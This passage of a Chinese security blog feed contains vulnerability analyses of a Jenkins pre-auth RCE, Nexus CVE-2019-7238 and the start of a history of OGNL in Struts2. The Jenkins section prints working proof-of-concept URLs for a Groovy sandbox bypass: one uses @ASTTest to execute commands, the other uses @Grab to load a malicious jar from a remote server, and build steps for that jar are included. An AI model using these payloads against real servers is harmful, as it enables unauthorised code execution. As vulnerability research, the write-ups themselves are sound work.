alt=""></p><p>可以看到总共可用的有30个之多，而真正可以控制的利用链只有<code>hudson.security.HudsonPrivateSecurityRealm.getUser(String)</code>。</p><blockquote><p>如果仔细阅读了文档，可以很容易根据方法名来理解这个方法主要是干什么的，比如get(…)[token]这样的，就说明他会根据路由解析策略来解析之后的参数，如果说是do(…)这样的，证明会执行相应的方法。</p></blockquote><p>那么也就说我们之后的操作需要基于<code>getUser</code>这个方法。根据路由解析策略，我们现在构造这样的url来进一步动态看一下在<code>User</code>对应的metaClass中有什么可以利用的。</p><h4 id="突破习惯性思维"><a href="#突破习惯性思维" class="headerlink" title="突破习惯性思维"></a>突破习惯性思维</h4><p>我们这此将url更改为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/securityRealm/user/admin</span><br></pre></td></tr></table></figure><p>看一下metaClass中的内容，发现都是<code>User</code>这个类中的方法，好像没有什么能用的东西，好像这个思路不可行了，那么这个时候能不能继续利用路由的解析特点来调用其他的类中的方法呢？可以的。</p><p>这个时候就要说一下在每个节点加载时候存在的一个问题，这部分是我自己的猜测可能有错误，希望大家指正。</p><p>根据0x01中的分析，我们都知道第一个根节点为<code>hudson.model.Hudson</code>，而<code>Hudson</code>又是继承于<code>Jenkins</code>的，所以他会将hudson和jenkins包下的model中所有的类全部都加载进metaClass中，从动态调试中我们也能看得出来：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/03/04/15513410174776.jpg" alt=""></p><p>那么由于我们是需要利用<code>securityRealm</code>来绕过权限检测，那么这个时候下次处理的根节点为<code>hudson.security.HudsonPrivateSecurityRealm</code>，同样，这里也会加载<code>HudsonPrivateSecurityRealm</code>这个类下的所有方法，因为这里只有<code>getUser(String)</code>中的String是收我们控制并且能执行的一个方法，所以我们这里就可以调用到<code>hudson.model.User</code>类，此时路由解析会认为下一个节点是该方法的一个参数（token），在解析下一个节点时将其节点带入到<code>getUser()</code>方法中。在这里metaClass中是<code>User</code>这个类中的所有方法，但是在路由解析中认为下一个节点并不会是与<code>User</code>所相关的参数或方法。<strong>所以当我们在这里新传入一个不在metaClass中的方法时，他首先会在构建metaClass的过程中尝试找到这个未知的类及其继承树中的类，并将其加入到metaClass中。</strong>而这个添加的过程，就在<code>webApp.getMetaClass(node)</code>中：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/03/04/15513424120873.jpg" alt=""></p><p>所以我可以构造这么样一个url来调用<code>hudson.search.Search#doIndex</code>来进行查询：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:8080/jenkins_war_war/securityRealm/user/admin/search/index?q=a</span><br></pre></td></tr></table></figure><p><img src="http://image-lucifaer.test.upcdn.net/2019/03/04/15513425180676.jpg" alt=""></p><p>同样我也可以尝试调用<code>hudson.model.Api#doJson</code>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:8080/jenkins_war_war/securityRealm/user/admin/api/json</span><br></pre></td></tr></table></figure><p><img src="http://image-lucifaer.test.upcdn.net/2019/03/04/15513427110206.jpg" alt=""></p><p>这么顺着想当然没有问题，但是我在分析的时候又有一个想法，如果说我不加<code>user/admin</code>也就是说不调用<code>User</code>能不能直接加载<code>api/json</code>来查看信息呢？</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/03/04/15513432188343.jpg" alt=""></p><p>不行，为什么呢？同样的问题也出现在调用<code>search/index</code>中。</p><h4 id="理解metaClass的加载机制"><a href="#理解metaClass的加载机制" class="headerlink" title="理解metaClass的加载机制"></a>理解metaClass的加载机制</h4><p>这个问题其实是一个比较钻牛角尖的问题，以及对<code>metaClass</code>加载方式不完全了解的问题。我们来看一下<code>User</code>的继承树关系图:</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/03/04/15514220055697.jpg" alt=""></p><p><code>User</code>类是直接继承于<code>AbstractModelObject</code>这个抽象类的，而<code>AbstractModelObject</code>是<code>SearchableModelObject</code>这个接口的实现，这是一条完整的继承树关系。我们来首先看一下<code>SearchableModelObject</code>这个接口：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/03/04/15514223563638.jpg" alt=""></p><p>在接口这里声明了一个<code>getSearch()</code>方法，也就是说当节点为<code>User</code>类时，在metaClass寻找的过程中是可以通过继承树关系来找到<code>getSearch()</code>方法的，接下来看一下具体的实现:</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/03/04/15514224780226.jpg" alt=""></p><p>这里会返回一个<code>Search</code>对象，然后这个对象中的所有方法都会被添加进入metaClass中，并通过<code>buildDispatchers()</code>来完成分派器的生成，然后就是正常的路由解析过程。</p><p>而在<code>HudsonPrivateSecurityRealm</code>的继承树关系中是没有这一层关系的：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/03/04/15514229289294.jpg" alt=""></p><p>所以<code>search/index</code>是没办法被找到的。</p><h4 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h4><p>现在我们理清楚了未什么跳板url需要这样构造，说实话，调用到<code>User</code>这个类其实就是完成了一个作用域的调转，从原来的限制比较死的作用域跳转到一个更加广阔的作用域中了。</p><p>那么现在问题来了，rce的利用链到底在哪里？</p><p>我们重新看看在<code>User</code>节点中还有什么是可以利用的：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/03/04/15514231583982.jpg" alt=""></p><p>这里好像可以调用<code>ModelObject</code>中的东西，那么先来分析一下<code>DescriptorByNameOwner</code>这个接口：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/03/04/15514232501037.jpg" alt=""></p><p><img src="http://image-lucifaer.test.upcdn.net/2019/03/04/15514248777003.jpg" alt=""></p><p>可以看到就是通过id来获取相应的Descriptor，也就是说接下来去寻找可用的Descriptor就行了。这里下个断点就能看到582个可调用的Descriptor了。</p><h1 id="0x05-Groovy沙盒绕过最终导致的rce"><a href="#0x05-Groovy沙盒绕过最终导致的rce" class="headerlink" title="0x05 Groovy沙盒绕过最终导致的rce"></a>0x05 Groovy沙盒绕过最终导致的rce</h1><p>Jenkins 2019-01-08的安全通告中包含了Groovy沙箱绕过的问题：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/03/04/15514256864031.jpg" alt=""></p><p>其实最后可利用的点并非这么几条路，但是其原理都是差不多的，这里用Script Security这个插件作为例子来分析。</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/03/04/15516698690607.jpg" alt=""></p><p>在<code>org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript#DescriptorImpl</code>中我们首先可以看到这个<code>DescriptorImpl</code>是继承于<code>Descriptor</code>的，也就是说我们上面的调用链可以访问到该方法；同时在这个方法中存在一个<code>doCheckScript</code>的方法，根据前面的分析，我们知道这个方法也是可以被我们利用的，并且这个方法的value是我们可控的，在这里完成的对value这个Groovy表达式的解析。</p><p>这里只是解析了Grovvy表达式，那么它是否执行了呢？这里我们先不讨论是否执行了，我们来试一试公告中的沙箱绕过方式是怎么做的。</p><h4 id="方法一：-ASTTest中执行assertions"><a href="#方法一：-ASTTest中执行assertions" class="headerlink" title="方法一：@ASTTest中执行assertions"></a>方法一：@ASTTest中执行assertions</h4><p>首先在本地试一下<code>@ASTTest</code>中是否能执行断言，执行的断言是否能执行代码：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/03/04/15516819287527.jpg" alt=""></p><p>然后试一下这个poc：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:8080/jenkins_war_war/securityRealm/user/test/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript?sandbox=true&amp;value=import+groovy.transform.*%0a</span><br><span class="line">%40ASTTest(value%3d%7bassert+java.lang.Runtime.getRuntime().exec(%22open+%2fApplications%2fCalculator.app%22)%7d)%0a</span><br><span class="line">class+Person%7b%7d</span><br></pre></td></tr></table></figure><p><img src="http://image-lucifaer.test.upcdn.net/2019/03/04/15516837235401.jpg" alt=""></p><p>成功执行代码。</p><p>这里的执行命令的方式可以换成groovy形式的执行方法:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:8080/jenkins_war_war/securityRealm/user/test/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript?sandbox=true&amp;value=import+groovy.transform.*%0a</span><br><span class="line">%40ASTTest(value%3d%7b+%22open+%2fApplications%2fCalculator.app%22.execute().text+%7d)%0a</span><br><span class="line">class+Person%7b%7d</span><br></pre></td></tr></table></figure><p><img src="http://image-lucifaer.test.upcdn.net/2019/03/04/15516859748705.jpg" alt=""></p><h4 id="方法二：-Grab引入外部的危险类"><a href="#方法二：-Grab引入外部的危险类" class="headerlink" title="方法二：@Grab引入外部的危险类"></a>方法二：@Grab引入外部的危险类</h4><p><code>Grape</code>是groovy内置的依赖管理引擎，具体的说明在<a href="http://docs.groovy-lang.org/latest/html/documentation/grape.html" target="_blank" rel="noopener">官方文档</a>中，可以仔细阅读。</p><p>在阅读<code>Grape</code>文档时，关于引入其他存储库这部分的操作是非常令人感兴趣的:</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/03/04/15516864448500.jpg" alt=""></p><p>如果这里的root是可以指向我们控制的服务器，引入我们已经构造好的恶意的文件呢？有点像JNDI注入了吧。</p><p>本地写个demo试一下:</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/03/04/15516872081851.jpg" alt=""></p><p>那么按照这个模式来构造，这里参考Orange第二篇文章或<a href="https://0xdf.gitlab.io/2019/02/27/playing-with-jenkins-rce-vulnerability.html" target="_blank" rel="noopener">这篇利用文章</a>，我的执行流程如下:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">javac Exp.java</span><br><span class="line">mkdir -p META-INF/services/</span><br><span class="line">echo Exp &gt; META-INF/services/org.codehaus.groovy.plugins.Runners</span><br><span class="line">jar cvf poc-2.jar Exp.class META-INF</span><br><span class="line">mkdir -p ./demo_server/exp/poc/2/</span><br><span class="line">mv poc-2.jar demo_server/exp/poc/2/</span><br></pre></td></tr></table></figure><p>然后构造如下的请求：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:8080/jenkins_war_war/securityRealm/user/test/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript?sandbox=true&amp;value=@GrabConfig(disableChecksums=true)%0a</span><br><span class="line">@GrabResolver(name=&apos;Exp&apos;, root=&apos;http://127.0.0.1:9999/&apos;)%0a</span><br><span class="line">@Grab(group=&apos;demo_server.exp&apos;, module=&apos;poc&apos;, version=&apos;2&apos;)%0a</span><br><span class="line">import Exp;</span><br></pre></td></tr></table></figure><p><img src="http://image-lucifaer.test.upcdn.net/2019/03/04/15516896230268.jpg" alt=""></p><h1 id="0x06-总结"><a href="#0x06-总结" class="headerlink" title="0x06 总结"></a>0x06 总结</h1><p>Orange这个洞真的是非常精彩，从动态路由入手，再到Pipeline这里groovy表达式解析，真的是一环扣一环，在这里我用正向跟进的方法将整个漏洞梳理了一遍，梳理前是非常迷惑的，梳理后恍然大悟，越品越觉得精彩。Orange Tql。</p><p>T T</p><h1 id="0x07-Reference"><a href="#0x07-Reference" class="headerlink" title="0x07 Reference"></a>0x07 Reference</h1><ul><li><a href="https://stackoverflow.com/questions/1809918/what-is-facet-in-javaee" target="_blank" rel="noopener">https://stackoverflow.com/questions/1809918/what-is-facet-in-javaee</a></li><li><a href="http://docs.groovy-lang.org/latest/html/documentation/grape.html" target="_blank" rel="noopener">http://docs.groovy-lang.org/latest/html/documentation/grape.html</a></li><li><a href="https://0xdf.gitlab.io/2019/02/27/playing-with-jenkins-rce-vulnerability.html" target="_blank" rel="noopener">https://0xdf.gitlab.io/2019/02/27/playing-with-jenkins-rce-vulnerability.html</a></li><li><a href="https://jenkins.io/security/advisories/" target="_blank" rel="noopener">https://jenkins.io/security/advisories/</a></li><li><a href="https://jenkins.io/doc/developer/book/" target="_blank" rel="noopener">https://jenkins.io/doc/developer/book/</a></li><li><a href="https://devco.re/blog/2019/01/16/hacking-Jenkins-part1-play-with-dynamic-routing/" target="_blank" rel="noopener">https://devco.re/blog/2019/01/16/hacking-Jenkins-part1-play-with-dynamic-routing/</a></li><li><a href="https://devco.re/blog/2019/02/19/hacking-Jenkins-part2-abusing-meta-programming-for-unauthenticated-RCE/" target="_blank" rel="noopener">https://devco.re/blog/2019/02/19/hacking-Jenkins-part2-abusing-meta-programming-for-unauthenticated-RCE/</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;这个漏洞是我个人感觉非常精彩的一个漏洞，非常值得好好的学习一下，Orange Tql！&lt;/p&gt;
    
    </summary>
    
      <category term="漏洞分析" scheme="https://lucifaer.com/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
      <category term="漏洞分析" scheme="https://lucifaer.com/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
      <category term="Java" scheme="https://lucifaer.com/tags/Java/"/>
    
      <category term="Jenkins" scheme="https://lucifaer.com/tags/Jenkins/"/>
    
  </entry>
  
  <entry>
    <title>Nexus Repository Manager 3 远程代码执行漏洞分析（CVE-2019-7238）</title>
    <link href="https://lucifaer.com/2019/02/19/Nexus%20Repository%20Manager%203%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%EF%BC%88CVE-2019-7238%EF%BC%89/"/>
    <id>https://lucifaer.com/2019/02/19/Nexus Repository Manager 3 远程代码执行漏洞分析（CVE-2019-7238）/</id>
    <published>2019-02-19T09:22:44.000Z</published>
    <updated>2019-02-19T09:28:28.000Z</updated>
    
    <content type="html"><![CDATA[<p>这篇分析其实在上周五也就是2月15号左右就已经分析完了，但是当时没有及时发出来，当周一看到iswin dalao发出的详尽分析后才把这篇分析发布做了预警算是慢了n步2333…</p><p>总体来说这个漏洞流程是比较好分析的，真正的难度是找漏洞触发点，当时分析的时候找了半天没找到触发点，最后还是硬着头皮在OrientDb的处理流程中绕了半天才意识到…还是太菜了</p><a id="more"></a><h1 id="0x00-漏洞概述"><a href="#0x00-漏洞概述" class="headerlink" title="0x00 漏洞概述"></a>0x00 漏洞概述</h1><blockquote><p>Insufficient access controls have been discovered in Nexus Repository Manager 3 which allow remote code execution.</p></blockquote><blockquote><p>An unauthenticated user can craft requests in such a manner that can execute java code on the server. We have mitigated the issue by adding the necessary access controls as well as disabling the ability to execute arbitrary java code via this path.  This advisory provides the pertinent information needed to properly address this vulnerability, along with the details on how to reach us if you have any further questions or concerns.</p></blockquote><p>从官方的漏洞简述来看简单的来说就是由于未授权访问的用户可以构造请求而造成任意代码执行。而且因为3.15.0+以上的版本增加了用户认证，所以3.15.0+的版本不受此漏洞的影响。所以根据diff的结果，可以大致的确定漏洞在<code>org.sonatype.nexus.coreui.ComponentComponent#previewAssets</code>：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/02/19/15505627413764.jpg" alt="-w1338"></p><h1 id="0x01-整体触发流程"><a href="#0x01-整体触发流程" class="headerlink" title="0x01 整体触发流程"></a>0x01 整体触发流程</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">ExtDirectModule$configure:60 # 路由绑定与请求解析</span><br><span class="line">  ExtDirectServlet$doPost:155 # 处理post请求</span><br><span class="line">    DirectJNgineServlet$doPost:595 # 根据不同的Content-Type来解析请求</span><br><span class="line">      DirectJNgineServlet$processRequest:632 # 解析json请求</span><br><span class="line">        JsonRequestProcesor$process:119 # 解析json语法树</span><br><span class="line">          JsonRequestProcessor$getIndividualJsonRequests:216 # 提取json数据</span><br><span class="line">        JsonRequestProcesor$process:133 # 构造返回结构</span><br><span class="line">ComponentComponent$previewAssets:188 # 解析post包中的data数据并构造查询语句查询包</span><br><span class="line">  ComponentComponent$previewAssets:208 # 获得查询结果</span><br><span class="line">    BrowseServiceImpl$previewAssets:252 # 构建OrientDb查询语句</span><br><span class="line">    BrowseServiceImpl$previewAssets:258 # 拼接查询语句</span><br><span class="line">    BrowseServiceImpl$previewAssets:262 # 执行查询</span><br><span class="line">      MetadataNodeEntityAdapter$countByQuery:221 # 执行OrientDb查询语句</span><br><span class="line">ContextExpressionFunction$execute:125 # 提取jexl表达式</span><br><span class="line">  ContextExpressionFunction$checkJexlExpression:154 # 执行jexl表达式</span><br></pre></td></tr></table></figure><h1 id="0x02-漏洞分析"><a href="#0x02-漏洞分析" class="headerlink" title="0x02 漏洞分析"></a>0x02 漏洞分析</h1><p>漏洞的触发主要分两部分：post包解析及jexl表达式执行。</p><h2 id="2-1-post包解析"><a href="#2-1-post包解析" class="headerlink" title="2.1 post包解析"></a>2.1 post包解析</h2><p>首先先看一下web.xml中如何做的路由解析：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/02/19/15504603584828.jpg" alt=""></p><p><code>org.sonatype.nexus.bootstrap.osgi.DelegatingFilter</code>拦截了所有的请求，大概率为动态路由加载，动态路由加载需要配置相应的<code>Module</code>模块用代码将配置与路由进行绑定并显式加载servlet，而该漏洞的入口就在<code>org.sonatype.nexus.extdirect.internal.ExtDirectModule#configure</code>中:</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/02/19/15504698938286.jpg" alt=""></p><p>直接跟进<code>org.sonatype.nexus.extdirect.internal.ExtDirectServlet$doPost</code>:</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/02/19/15504699262539.jpg" alt=""></p><p>继续向下更进看到处理post请求的部分：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/02/19/15504702237568.jpg" alt=""></p><p>在这里我们跟进看一下如何对json格式的请求进行处理：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/02/19/15504702513086.jpg" alt=""></p><p><img src="http://image-lucifaer.test.upcdn.net/2019/02/19/15504706911673.jpg" alt=""></p><p>首先对json的语法树进行解析，将数据提取出来：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/02/19/15504708404906.jpg" alt=""></p><p>可以看到需要5个变量分别为<code>action</code>、<code>method</code>、<code>tid</code>、<code>type</code>、<code>data</code>。</p><p>注意到<code>isBatched</code>是由参数长度决定的，而返回的一个数组，其长度为1，所以<code>isBatched</code>为<code>false</code>。之后就是传入<code>processIndividualRequestsInThisThread</code>方法中：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/02/19/15504715738470.jpg" alt=""></p><p>在这里构造返回的结果，可以看到这里在有一个json反序列化的过程，这里主要是将返回结果以json格式返回。</p><h2 id="2-2-jexl表达式执行"><a href="#2-2-jexl表达式执行" class="headerlink" title="2.2 jexl表达式执行"></a>2.2 jexl表达式执行</h2><p>从post包的解析中可以得知我们需要构造5个参数，同时当我们构造好<code>action</code>和<code>method</code>后，可以直接动态调用相应的类与方法。</p><p>这个漏洞出现在<code>org.sonatype.nexus.coreui.ComponentComponent#previewAssets</code>:</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/02/19/15504724137293.jpg" alt=""></p><p>首先将post包中<code>repositoryName</code>、<code>expression</code>、<code>type</code>的值取出来，这三个参数分别代表已经存在的<code>repository</code>的名字、expression的类型，以及表达式。</p><p>着重看一下jexl的处理过程：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/02/19/15504726133105.jpg" alt=""></p><p><img src="http://image-lucifaer.test.upcdn.net/2019/02/19/15504726645374.jpg" alt=""></p><p>注意到这里只是实例化了一个<code>JexlSelector</code>对象，而并没有调用<code>evaluate</code>来执行表达式，所以漏洞的触发点在其他的位置。而真正的表达式执行点在<code>browseService.previewAssets</code>的处理过程中，这一点也是这个漏洞最为难找的一个点。</p><p>跟进<code>previewAssets</code>的实现，在<code>org.sonatype.nexus.repository.browse.internal.BrowseServiceImpl#previewAssets</code>：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/02/19/15504739454711.jpg" alt=""></p><p>在这里可以看到表达式最后会被当做参数形成SQL查询，最后由OrientDb执行：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/02/19/15504742411091.jpg" alt=""></p><p>但是OrientDb本身是没有<code>contentExpression</code>这个方法的，也就是说明这个方法是用Java来实现的，找了一下，在<code>org.sonatype.nexus.repository.selector.internal.ContentExpressionFunction</code>：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/02/19/15504753654778.jpg" alt=""></p><p>在<code>checkJexlExpression</code>中：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/02/19/15504754823135.jpg" alt=""></p><p>调用了<code>selectorManage.evaluate</code>来执行jexl表达式：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/02/19/15504755769130.jpg" alt=""></p><h1 id="0x03-构造POC"><a href="#0x03-构造POC" class="headerlink" title="0x03 构造POC"></a>0x03 构造POC</h1><p>通过上面的分析，我们只需要按照post包解析中的参数进行相应的构造即可，下面为一个例子：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/02/19/15505678890758.jpg" alt=""></p><p>注意，这个漏洞需要当Nexus中存在已有的jar包，在本地验证的时候先传一个jar报上去。至于原理分析可能后面会单独再拿出来分析。</p><h1 id="0x04-Reference"><a href="#0x04-Reference" class="headerlink" title="0x04 Reference"></a>0x04 Reference</h1><ul><li><a href="https://support.sonatype.com/hc/en-us/articles/360017310793-CVE-2019-7238-Nexus-Repository-Manager-3-Missing-Access-Controls-and-Remote-Code-Execution-February-5th-2019" target="_blank" rel="noopener">https://support.sonatype.com/hc/en-us/articles/360017310793-CVE-2019-7238-Nexus-Repository-Manager-3-Missing-Access-Controls-and-Remote-Code-Execution-February-5th-2019</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;这篇分析其实在上周五也就是2月15号左右就已经分析完了，但是当时没有及时发出来，当周一看到iswin dalao发出的详尽分析后才把这篇分析发布做了预警算是慢了n步2333…&lt;/p&gt;
&lt;p&gt;总体来说这个漏洞流程是比较好分析的，真正的难度是找漏洞触发点，当时分析的时候找了半天没找到触发点，最后还是硬着头皮在OrientDb的处理流程中绕了半天才意识到…还是太菜了&lt;/p&gt;
    
    </summary>
    
      <category term="漏洞分析" scheme="https://lucifaer.com/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
      <category term="漏洞分析" scheme="https://lucifaer.com/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
      <category term="Java" scheme="https://lucifaer.com/tags/Java/"/>
    
      <category term="Nexuss" scheme="https://lucifaer.com/tags/Nexuss/"/>
    
  </entry>
  
  <entry>
    <title>浅析OGNL的攻防史</title>
    <link href="https://lucifaer.com/2019/01/16/%E6%B5%85%E6%9E%90OGNL%E7%9A%84%E6%94%BB%E9%98%B2%E5%8F%B2/"/>
    <id>https://lucifaer.com/2019/01/16/浅析OGNL的攻防史/</id>
    <published>2019-01-16T07:04:00.000Z</published>
    <updated>2019-01-16T07:06:03.000Z</updated>
    
    <content type="html"><![CDATA[<p>在分析Struts2漏洞的过程中就一直想把OGNL的运行机制以及Struts2对OGNL的防护机制总结一下，但是一直苦于自己对Struts2的理解不是很深刻而迟迟无法动笔，最近看了<a href="https://lgtm.com/blog/apache_struts_CVE-2018-11776-exploit" target="_blank" rel="noopener">lgtm的这篇文章</a>收获良多，就想在这篇文章的基础上总结一下目前自己对于OGNL的一些理解，希望师傅们斧正。</p><a id="more"></a><h1 id="0x01-OGNL与Struts2"><a href="#0x01-OGNL与Struts2" class="headerlink" title="0x01 OGNL与Struts2"></a>0x01 OGNL与Struts2</h1><h2 id="1-1-root与context"><a href="#1-1-root与context" class="headerlink" title="1.1 root与context"></a>1.1 root与context</h2><p>OGNL中最需要理解清楚的是<code>root</code>（根对象）、<code>context</code>（上下文）。</p><ul><li><code>root</code>：root可以理解为是一个java对象，表达式所规定的所有操作都是通过root来指定其对哪个对象进行操作。</li><li><code>context</code>：context可以理解为对象运行的上下文环境，context以MAP的结构，利用键值对关系来描述对象中的属性以及值。</li></ul><p>Struts2框架使用了标准的命名上下文（naming context，我实在是不知道咋翻译了-. -）来执行OGNL表达式。处理OGNL的最顶层对象是一个Map对象，通常称这个Map对象为<code>context map</code>或者<code>context</code>。而OGNL的<code>root</code>就在这个<code>context map</code>中。<strong>在表达式中可以直接引用<code>root</code>对象的属性，如果需要引用其他的对象，需要使用<code>#</code>标明</strong>。</p><p>框架将OGNL里的<code>context</code>变成了我们的<code>ActionContext</code>，将<code>root</code>变成了<code>valueStack</code>。Struts2将其他对象和<code>valueStack</code>一起放在<code>ActionContext</code>中，这些对象包括<code>application</code>、<code>session</code>、<code>request context</code>的上下文映射。下面是一个图例：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/01/16/15464230621989.jpg" alt=""></p><h2 id="1-2-ActionContext"><a href="#1-2-ActionContext" class="headerlink" title="1.2 ActionContext"></a>1.2 ActionContext</h2><p><code>ActionContext</code>是action的上下文，其本质是一个MAP，简单来说可以理解为一个action的小型数据库，整个action生命周期（线程）中所使用的数据都在这个<code>ActionContext</code>中。而对于OGNL来说<code>ActionContext</code>就是充当<code>context</code>的，并且在框架中</p><p>这里盗一张图来说明<code>ActionContext</code>中存有哪些东西：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/01/16/15464139094502.jpg" alt=""></p><p> 可以看到其中有三个常见的作用域<code>request</code>、<code>session</code>、<code>application</code>。</p><ul><li><code>attr</code>作用域则是保存着上面三个作用域的所有属性，如果有重复的则以<code>request</code>域中的属性为基准。</li><li><code>paramters</code>作用域保存的是表单提交的参数。</li><li><code>VALUE_STACK</code>，也就是常说的值栈，保存着<code>valueStack</code>对象，也就是说可以通过<code>ActionContext</code>访问到<code>valueStack</code>中的值。</li></ul><h2 id="1-3-valueStack"><a href="#1-3-valueStack" class="headerlink" title="1.3 valueStack"></a>1.3 valueStack</h2><p>值栈本身是一个ArrayList，充当OGNL的<code>root</code>：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/01/16/15464146328628.jpg" alt=""></p><p><code>root</code>在源码中称为<code>CompoundRoot</code>，它也是一个栈，每次操作<code>valueStack</code>的出入栈操作其实就是对<code>CompoundRoot</code>进行对应的操作。每当我们访问一个action时，就会将action加入到栈顶，而提交的各种表单参数会在<code>valueStack</code>从顶向下查找对应的属性进行赋值。</p><p>这里的<code>context</code>就是<code>ActionContext</code>的引用，方便在值栈中去查找action的属性。</p><h2 id="1-4-ActionContext和valueStack的关系"><a href="#1-4-ActionContext和valueStack的关系" class="headerlink" title="1.4 ActionContext和valueStack的关系"></a>1.4 ActionContext和valueStack的关系</h2><p>可以看到其实<code>ActionContext</code>和<code>valueStack</code>是“相互包含”的关系，当然准确点来说，<code>valueStack</code>是<code>ActionContext</code>中的一部分，而<code>ActionContext</code>所描述的也不只是一个OGNL<code>context</code>的代替品，毕竟它更多是为action构建一个独立的运行环境（新的线程）。而这样的关系就导致了我们可以通过<code>valueStack</code>访问<code>ActionContext</code>中的属性而反过来亦然。</p><p>其实可以用一种不是很标准的表达方式来描述这样的关系：可以把<code>valueStack</code>想成<code>ActionContext</code>的索引，你可以直接通过索引来找到表中的数据，也可以在表中找到所有数据的索引，无非是书与目录的关系罢了。</p><h1 id="0x02-OGNL的执行"><a href="#0x02-OGNL的执行" class="headerlink" title="0x02 OGNL的执行"></a>0x02 OGNL的执行</h1><h2 id="2-1-初始化ValueStack"><a href="#2-1-初始化ValueStack" class="headerlink" title="2.1 初始化ValueStack"></a>2.1 初始化ValueStack</h2><p>我们从代码的角度来看看OGNL的执行流。从Struts2框架的代码中，我们可以清楚的看到OGNL的包是位于<code>xwork2</code>中的，而连通Struts2与xwork2的桥梁就是<code>ActionProxy</code>，也就是说在<code>ActionProxy</code>接管整个控制权前，<code>FilterDispatcher</code>就已经完成了对<code>ActionContext</code>的建立与初始化。</p><p>而具体的代码是在<code>org.apache.struts2.dispatcher.PrepareOperations</code>中：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/01/16/15464833904918.jpg" alt=""></p><p>在这里如果没有Context存在的话，则会调用<code>ValueStackFactory</code>这个接口的<code>createValueStack</code>方法，跟进看一下：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/01/16/15464841735723.jpg" alt=""></p><p>跟进<code>OgnlValueStackFactory</code>：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/01/16/15464842298773.jpg" alt=""></p><p>这几个参数分别为：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/01/16/15464842534430.jpg" alt=""></p><p>跟进看一下<code>OgnlValueStack</code>的构造方法：</p><p><img src="http://image-lucifaer.test.upcdn.net/2019/01/16/15464844823917.jpg" alt=""></p><p><img src="http://image-lucifaer.test.upcdn.net/2019/01/16/15464845456793.jpg" 